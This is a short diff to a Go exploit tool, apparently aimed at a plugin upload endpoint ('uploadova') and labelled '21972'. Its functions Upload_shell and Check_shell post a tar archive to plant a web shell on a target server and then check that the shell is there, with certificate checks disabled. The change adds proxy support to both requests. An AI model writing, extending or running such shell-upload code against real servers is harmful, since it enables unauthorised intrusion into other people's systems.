@@ -20,6 +20,7 @@ import (
 )
 
 var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"
+var Proxy_server = ""
 
 func Readme() {
 	fmt.Println("I'm 21972")
@@ -92,6 +93,7 @@ func Upload_shell(url string, buf bytes.Buffer) bool {
 	client.EnableInsecureSkipVerify()
 	client.EnableForceHTTP1()
 	client.SetUserAgent(user_agent)
+	client.SetProxyURL(Proxy_server)
 	resp, err := client.R().SetFileBytes("uploadFile", "test.tar", buf.Bytes()).Post(url + "/ui/vropspluginui/rest/services/uploadova") // Use R() to create a request.
 	if err != nil {
 		_ = err
@@ -174,6 +176,7 @@ func Check_shell(url string, os_name string) {
 	client.EnableForceHTTP1()
 	client.SetTimeout(3 * time.Second)
 	client.DisableKeepAlives()
+	client.SetProxyURL(Proxy_server)
 	client.SetUserAgent(user_agent)
 
 	shell_url := ""
